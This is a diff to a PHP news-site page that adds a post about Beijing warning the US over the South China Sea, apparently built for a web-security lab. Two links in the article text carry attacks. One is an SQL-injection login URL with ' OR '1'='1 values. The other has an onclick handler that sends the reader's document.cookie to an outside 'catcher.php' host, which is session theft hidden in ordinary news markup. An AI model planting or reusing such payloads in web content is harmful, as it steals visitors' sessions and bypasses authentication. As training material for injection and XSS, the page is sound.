@@ -10,6 +10,30 @@ include 'header.php';
 	  
     	  
     <!-- headline -->    
+     <h2> <a href="/featured/20160908-beijing-warns-us.php">Beijing warns US to stay out of South China Sea dispute</a></h2>
+       
+  <p class="details">By Martin Farrer | Thursday 8 September 2016 07.20 BST<a href="#"></a> </p>
+           <div class="thumb"><a href="#"><img src="images/southchianasea.png" alt="SouthChianaSea" /></a></div>
+       
+<p>
+China has sent a <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%
+271&submit=Login" target="_blank">  coded warning </a> to the United States to stay out of the South China Sea dispute after Beijing was again accused of building permanent structures on <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#"> islands in the area.</a>
+
+
+</p>
+
+<p class="readmore">[ <a href="/featured/20160908-beijing-warns-us.php">read more</a> ]</p>
+	          	<div class="break"></div>
+</div>  
+<!-- end of post -->
+
+
+
+<!-- start of post  -->
+<div class="post">
+	  
+    	  
+    <!-- headline -->    
      <h2> <a href="/featured/20160907-syrian-opposition-coalition.php">Syrian opposition coalition to announce democratic transition plan</a></h2>
        
   <p class="details">By Patrick Wintour | Wednesday 7 September 2016 08.07 BST <a href="#"></a> </p>
